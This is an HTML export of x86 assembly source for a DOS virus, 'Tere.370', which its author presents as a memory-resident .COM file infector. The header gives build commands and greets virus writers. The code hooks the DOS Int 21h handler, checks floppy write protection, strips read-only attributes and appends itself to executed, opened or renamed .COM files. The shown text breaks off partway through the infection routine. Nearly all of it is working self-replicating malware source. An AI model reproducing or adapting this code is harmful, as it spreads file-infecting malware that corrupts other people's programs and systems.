<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Tere.370 v1.0 NiL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Licence :]</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;This code is public domain. So You can take it or leave it / modify it / use</span><span class="sc0">
</span><span class="sc1">;it for Your own purposes etc. If You wish to show respect to my work leave</span><span class="sc0">
</span><span class="sc1">;those magic letters NiL inside code. BTW this is not my pseudonym. It is</span><span class="sc0">
</span><span class="sc1">;rather a codename for my activity of producing these tiny self-replicating</span><span class="sc0">
</span><span class="sc1">;pieces of code. Have fun!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Introduction</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;My very first infector. Not so bad as the "Hello Worlds" usually are. (BTW</span><span class="sc0">
</span><span class="sc1">;the text pattern "Tere maailm!" inside code in Estonian means "Hello World!".)</span><span class="sc0">
</span><span class="sc1">;Good for learning purposes.</span><span class="sc0">
</span><span class="sc1">;Memory resident .COM infector for DOS executables. It stays resident and</span><span class="sc0">
</span><span class="sc1">;infects .COM files when they are executed, renamed/moved, opened or their</span><span class="sc0">
</span><span class="sc1">;attributes are changed. Int21 calls:</span><span class="sc0">
</span><span class="sc1">;  AX,4B00h Execution</span><span class="sc0">
</span><span class="sc1">;  AX,3D00h Open for reading</span><span class="sc0">
</span><span class="sc1">;  AX,4301h Set attribute</span><span class="sc0">
</span><span class="sc1">;  AH,56h   Rename/Move</span><span class="sc0">
</span><span class="sc1">;No payload.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Features</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;FD write protection check.</span><span class="sc0">
</span><span class="sc1">;  Reads and tries to write back a sector using Int13 services.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;File Read-Only bit removal</span><span class="sc0">
</span><span class="sc1">;  Removes the R-bit when needed and sets back after the job is done.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;For further reading visit:</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;http://www.datafellows.com/v-descs/tere.htm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Greetings</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;to virii writers - keep up a good work &amp; don't write harmful virii,</span><span class="sc0">
</span><span class="sc1">;to Wannabees for having an interest in something most people do not have:</span><span class="sc0">
</span><span class="sc1">;   Knowledge (no ironics),</span><span class="sc0">
</span><span class="sc1">;to AV people for earning their living in fighting our progs (no ironics),</span><span class="sc0">
</span><span class="sc1">;to VLAD for producing high-quality technical magazines,</span><span class="sc0">
</span><span class="sc1">;to Ralf Brown for his wonderful interrupt list,</span><span class="sc0">
</span><span class="sc1">;to creators of SoftIce, Sourcer, Hiew for magnificent tools,</span><span class="sc0">
</span><span class="sc1">;to all involved in the scene (Sorry, I think I'm going to leave the scene</span><span class="sc0">
</span><span class="sc1">;  soon).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;Here it comes and assembles using commands:</span><span class="sc0">
</span><span class="sc1">;tasm /m2 tere.asm</span><span class="sc0">
</span><span class="sc1">;tlink /t /x tere.obj</span><span class="sc0">
     </span><span class="sc9">.MODEL</span><span class="sc0">  </span><span class="sc10">TINY</span><span class="sc0">
     </span><span class="sc9">.CODE</span><span class="sc0">
     </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">ID</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">99h</span><span class="sc0">                   </span><span class="sc1">;Resident? id</span><span class="sc0">
</span><span class="sc5">ProgOfs</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">                  </span><span class="sc1">;COM program offset</span><span class="sc0">
</span><span class="sc5">VirSize</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">@End</span><span class="sc4">-</span><span class="sc5">@Start</span><span class="sc0">           </span><span class="sc1">;V size</span><span class="sc0">
</span><span class="sc5">BufOfs</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">VirSize</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">;Sector r/w buffer offset</span><span class="sc0">
</span><span class="sc5">BufSize</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1024</span><span class="sc0">                  </span><span class="sc1">;Sector r/w buffer size</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">@Begin</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">1Eh</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;PUSH DS, JMP V_Code</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">@Start</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;Original beginning of program</span><span class="sc0">
     </span><span class="sc6">CLD</span><span class="sc0">
     </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
     </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@Next</span><span class="sc0">                 </span><span class="sc1">;Calculate V offset</span><span class="sc0">
</span><span class="sc5">@Nop</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'NiL'</span><span class="sc0">
</span><span class="sc5">@Next</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
     </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">@Nop</span><span class="sc4">-</span><span class="sc5">@Start</span><span class="sc0">

     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc5">ID</span><span class="sc0">   </span><span class="sc1">;Already resident?</span><span class="sc0">
     </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">@Done</span><span class="sc0">

     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">                 </span><span class="sc1">;Make new MCB</span><span class="sc0">
     </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
     </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">12h</span><span class="sc4">],(</span><span class="sc5">BufOfs</span><span class="sc4">+</span><span class="sc5">BufSize</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">03h</span><span class="sc4">],(</span><span class="sc5">BufOfs</span><span class="sc4">+</span><span class="sc5">BufSize</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
     </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">
     </span><span class="sc6">STOSB</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
     </span><span class="sc6">STOSW</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,(</span><span class="sc5">BufOfs</span><span class="sc4">+</span><span class="sc5">BufSize</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc0">
     </span><span class="sc6">STOSW</span><span class="sc0">
     </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">

     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
     </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,(</span><span class="sc5">VirSize</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
     </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSW</span><span class="sc0">                 </span><span class="sc1">;Move V to memory DS:[SI]-&gt;ES:[DI]</span><span class="sc0">

     </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
     </span><span class="sc6">MOVSW</span><span class="sc0">
     </span><span class="sc6">MOVSW</span><span class="sc0">
     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">VirSize</span><span class="sc0">            </span><span class="sc1">;Place for old handler</span><span class="sc0">
     </span><span class="sc6">MOVSW</span><span class="sc0">                         </span><span class="sc1">;Save old Int 21h handler address</span><span class="sc0">
     </span><span class="sc6">MOVSW</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc5">@New21</span><span class="sc4">-</span><span class="sc5">@Start</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc5">ID</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">

     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">                    
     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
</span><span class="sc5">@Done</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">ProgOfs</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">                    </span><span class="sc1">;Program offset (100h) into stack</span><span class="sc0">
     </span><span class="sc6">MOVSW</span><span class="sc0">                         </span><span class="sc1">;Restore original beginning of file</span><span class="sc0">
     </span><span class="sc6">MOVSW</span><span class="sc0">
     </span><span class="sc6">RETN</span><span class="sc0">                          </span><span class="sc1">;Jump to program code</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Msg</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'Tere maailm!'</span><span class="sc0">
</span><span class="sc5">OurByte</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">1Eh</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">@New21</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">              </span><span class="sc1">;Execution service?</span><span class="sc0">
     </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">@Inf</span><span class="sc0">
     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">              </span><span class="sc1">;Open for reading service?</span><span class="sc0">
     </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">@Inf</span><span class="sc0">
     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">              </span><span class="sc1">;Set attribute service?</span><span class="sc0">
     </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">@Inf</span><span class="sc0">
     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc0">                </span><span class="sc1">;Rename/Move service?</span><span class="sc0">
     </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">@Inf</span><span class="sc0">
     </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">@OldHand</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">@Inf</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
     
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
     </span><span class="sc6">CLD</span><span class="sc0">
</span><span class="sc5">@Letter</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">LODSB</span><span class="sc0">
     </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
     </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">@Prot</span><span class="sc0">
     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
     </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">@Letter</span><span class="sc0">
     </span><span class="sc6">LODSW</span><span class="sc0">
     </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0DFDFh</span><span class="sc0">
     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc12">'OC'</span><span class="sc0">
     </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">@Prot</span><span class="sc0">
     </span><span class="sc6">LODSB</span><span class="sc0">
     </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc0">
     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc0">
     </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">@Prot</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">11</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0DFDFh</span><span class="sc0">
     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc12">'OC'</span><span class="sc0">
     </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">@Prot</span><span class="sc0">
</span><span class="sc1">;--------------------------------------</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
     </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
     </span><span class="sc6">LODSW</span><span class="sc0">
     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
     </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">@Default</span><span class="sc0">
     </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
     </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">
     </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">@NoDeflt</span><span class="sc0">
</span><span class="sc5">@Default</span><span class="sc4">:</span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">
     </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc5">@NoDeflt</span><span class="sc4">:</span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
     </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">@Done13</span><span class="sc0">
     </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                 </span><span class="sc1">;DL:=Drive</span><span class="sc0">
     </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc8">DH</span><span class="sc0">                 </span><span class="sc1">;DH:=Head=0</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0101h</span><span class="sc0">              </span><span class="sc1">;CH:=Track(0-n); CL:=Sector(1-n)</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">BufOfs</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">              </span><span class="sc1">;AH:=SubFn(Read); AL:=Sector count</span><span class="sc0">
     </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
     </span><span class="sc6">JC</span><span class="sc0">  </span><span class="sc5">@Done13</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">              </span><span class="sc1">;AH:=SubFn(Write)</span><span class="sc0">
     </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
</span><span class="sc5">@Done13</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
     </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">@NoProt</span><span class="sc0">
</span><span class="sc5">@Prot</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">@Wrong</span><span class="sc0">
</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">@NoProt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
     </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">                   </span><span class="sc1">;Get file attributes</span><span class="sc0">
     </span><span class="sc6">JC</span><span class="sc0">  </span><span class="sc5">@Wrong</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
     </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
     </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">                   </span><span class="sc1">;Clear file attributes</span><span class="sc0">
     </span><span class="sc6">JC</span><span class="sc0">  </span><span class="sc5">@OpenErr</span><span class="sc0">
</span><span class="sc1">;--------------------------------------</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">              </span><span class="sc1">;Open executed file</span><span class="sc0">
     </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">
     </span><span class="sc6">JC</span><span class="sc0">  </span><span class="sc5">@OpenErr</span><span class="sc0">
     </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                 </span><span class="sc1">;Handle of file into BX</span><span class="sc0">

     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;Read CX first bytes of file to DS:[DX]</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
     </span><span class="sc6">CWD</span><span class="sc0">
     </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">
     </span><span class="sc6">JC</span><span class="sc0">  </span><span class="sc5">@FileErr</span><span class="sc0">

     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc2">0E91Eh</span><span class="sc0">
     </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">@FileErr</span><span class="sc0">              </span><span class="sc1">;File already infected</span><span class="sc0">
     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
     </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">@FileErr</span><span class="sc0">

     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">              </span><span class="sc1">;Seek EOF (FileSize into AX)</span><span class="sc0">
     </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
     </span><span class="sc6">CWD</span><span class="sc0">
     </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">65535</span><span class="sc4">-(</span><span class="sc5">VirSize</span><span class="sc4">+</span><span class="sc5">ProgOfs</span><span class="sc4">)</span><span class="sc0">
     </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">@FileErr</span><span class="sc0">              </span><span class="sc1">;File too big</span><span class="sc0">

     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[((</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">OurByte</span><span class="sc4">)-(</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">@Start</span><span class="sc4">))+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
         
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">              </span><span class="sc1">;Get file time</span><span class="sc0">
     </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">

     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">VirSize</span><span class="sc0">            </span><span class="sc1">;Write V to end of file from DS:[DX]</span><span class="sc0">
